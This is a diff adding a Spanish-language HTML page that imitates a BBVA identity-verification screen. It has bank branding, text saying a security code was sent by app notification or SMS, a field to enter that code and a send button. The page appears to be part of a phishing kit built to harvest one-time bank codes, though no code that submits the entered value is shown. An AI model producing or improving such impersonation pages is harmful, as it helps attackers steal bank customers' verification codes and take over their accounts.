@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BBVA - Verificación</title>
+
+<style>
+*{box-sizing:border-box;}
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#f2f2f2;
+}
+
+/* HEADER */
+.header{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+.header img{
+  height:45px;
+}
+
+/* CONTENT */
+.container{
+  max-width:600px;
+  margin:0 auto;
+  text-align:center;
+  padding:20px;
+}
+
+h2{
+  text-align:left;
+  margin-top:20px;
+}
+
+.text{
+  text-align:left;
+  line-height:1.5;
+  color:#333;
+}
+
+/* INPUT */
+.label{
+  margin-top:30px;
+  color:#5c6bc0;
+}
+
+input{
+  width:100%;
+  padding:14px;
+  border:1px solid #ccc;
+  border-radius:4px;
+  margin-top:10px;
+}
+
+/* BUTTON */
+.btn{
+  width:100%;
+  margin-top:15px;
+  padding:14px;
+  background:#1e3fa3;
+  color:#fff;
+  border:none;
+  border-radius:4px;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
+}
+
+.btn.active{
+  background:#0d2c8b;
+}
+
+/* LINKS */
+.link{
+  margin-top:20px;
+  color:#1e3fa3;
+  font-weight:bold;
+}
+
+.help{
+  margin-top:40px;
+  text-align:left;
+  color:#1e3fa3;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="logo.png">
+</div>
+
+<div class="container">
+
+  <h2>Vamos a validar tu identidad</h2>
+
+  <div class="text">
+    En BBVA, tu seguridad es nuestra principal preocupación. Para verificar tu identidad, te hemos enviado un código de seguridad que encontrarás en las notificaciones de tu dispositivo móvil, ya sea de la aplicación BBVA o como un mensaje de texto (SMS). Ingresa el código, haz clic en “enviar” y ¡todo listo! Tu identidad estará confirmada de manera segura.
+  </div>
+
+  <div class="label">Código de seguridad</div>
+
+  <input type="text" id="code">
+
+  <button class="btn" id="btn">ENVIAR</button>
+
+  <div class="link">REENVIAR CÓDIGO</div>
+
+  <div class="help">Ayuda</div>
+
+</div>
+
+<script>
+const input = document.getElementById('code');
+const btn = document.getElementById('btn');
+
+input.addEventListener('input',()=>{
+  if(input.value.trim() !== ''){
+    btn.classList.add('active');
+  } else {
+    btn.classList.remove('active');
+  }
+});
+</script>
+
+</body>
+</html>
